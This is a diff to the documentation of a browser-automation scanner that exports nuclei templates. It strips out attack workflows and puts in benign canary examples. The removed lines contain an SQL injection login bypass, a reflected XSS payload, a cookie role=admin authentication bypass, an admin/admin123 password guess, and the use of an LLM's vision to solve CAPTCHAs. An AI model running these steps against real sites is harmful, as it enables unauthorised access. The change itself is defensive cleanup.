@@ -167,19 +167,18 @@ The generated YAML is standard nuclei headless format — it can also be used wi
 
 ### Recording workflow example
 ```bash
-# 1. Record a login bypass POC
-playwright open http://target.com/login --session s1 --record
-playwright fill s1 "input[name=user]" "admin' OR '1'='1"
-playwright fill s1 "input[name=pass]" "x"
+# 1. Record a reproducible browser interaction
+playwright open http://target.com/search --session s1 --record
+playwright fill s1 "input[name=q]" "aiscan_canary_8f2a"
 playwright click s1 "button[type=submit]"
 playwright wait-for s1 --stable
-playwright text-content s1 "#welcome"
-playwright record s1 --save sqli-login.yaml --id sqli-login-bypass
+playwright text-content s1
+playwright record s1 --save interaction.yaml --id browser-interaction
 playwright close s1
 
 # 2. Replay against other targets
-playwright template sqli-login.yaml http://target2.com/login
-playwright template sqli-login.yaml http://target3.com/login
+playwright template interaction.yaml http://target2.com/search
+playwright template interaction.yaml http://target3.com/search
 ```
 
 ### What gets recorded
@@ -215,80 +214,19 @@ playwright template <file.yaml> <target-url> [--payload key=value ...]
 Templates support the full nuclei headless action set (29 action types), DSL expressions (`{{rand_int()}}`, `{{replace()}}`, etc.), payload iteration (sniper/pitchfork/clusterbomb), template variables, matchers, and extractors.
 
 ```bash
-# Run a CVE template
-playwright template cve-2024-xxxx.yaml http://target.com
+# Run a recorded template
+playwright template recorded-flow.yaml http://target.com
 
 # Run with payload overrides
-playwright template login-brute.yaml http://target.com --payload username=admin --payload password=secret
+playwright template recorded-flow.yaml http://target.com --payload query=test
 
 # Run a self-contained template (URL embedded in template)
-playwright template prototype-pollution-check.yaml http://target.com
+playwright template self-contained-check.yaml http://target.com
 ```
 
-## Vulnerability Verification Workflows
+## Security Use Notes
 
-### XSS Verification (with recording)
-```bash
-playwright open http://target.com/search --session xss --ttl 0 --record
-playwright discover xss
-playwright dialog xss --arm
-playwright fill xss "input[name=q]" "<script>alert('xss_canary_8f2a')</script>"
-playwright click xss "button[type=submit]"
-playwright wait-for xss --stable
-playwright dialog xss --check
-# If captured: {"type":"alert","message":"xss_canary_8f2a"} then confirmed
-playwright screenshot xss --output xss_evidence.png
-playwright record xss --save xss-poc.yaml --id reflected-xss
-playwright close xss
-# Replay against other targets:
-playwright template xss-poc.yaml http://target2.com/search
-```
-
-### SQLi via Login Bypass (with recording)
-```bash
-playwright open http://target.com/login --session sqli --ttl 0 --record
-playwright autofill sqli --form 0 --data "username=admin' OR '1'='1,password=x"
-playwright click sqli "button[type=submit]"
-playwright wait-for sqli --stable
-playwright goto sqli
-# Check for dashboard/admin content
-playwright record sqli --save sqli-poc.yaml --id sqli-login
-playwright close sqli
-```
-
-### CAPTCHA + Weak Password
-```bash
-playwright open http://target.com/login --session s1 --ttl 0
-playwright discover s1
-playwright screenshot s1 --selector "img#captcha" --output captcha.png
-# Use the LLM's vision capability to read the CAPTCHA from captcha.png
-playwright autofill s1 --form 0 --data "username=admin,password=admin123,captcha=<solved>"
-playwright click s1 "button[type=submit]"
-playwright wait-for s1 --stable
-playwright url s1
-playwright close s1
-```
-
-### Auth Bypass via Cookie
-```bash
-playwright open http://target.com/ --session auth --ttl 0
-playwright cookies auth --set role=admin
-playwright evaluate auth "location.href='/admin'"
-playwright wait-for auth --stable
-playwright goto auth
-playwright screenshot auth --output auth_evidence.png
-playwright close auth
-```
-
-### SPA Route Discovery
-```bash
-playwright open http://spa-app.com/ --session spa --ttl 0
-playwright click spa "a[href='/dashboard']"
-playwright wait-for spa --stable
-playwright discover spa
-# Check "Navigated Links" section for all SPA routes detected
-playwright close spa
-```
+Use browser automation when evidence depends on rendered DOM, user interaction, dialogs, cookies, storage, client-side routing, screenshots, or network traces. Keep tests low-risk, use unique canaries for input experiments, and close sessions when finished. When an interaction is confirmed as useful evidence, save a screenshot or recorded template only as needed for reproducibility.
 
 ## Playwright API Mapping
 
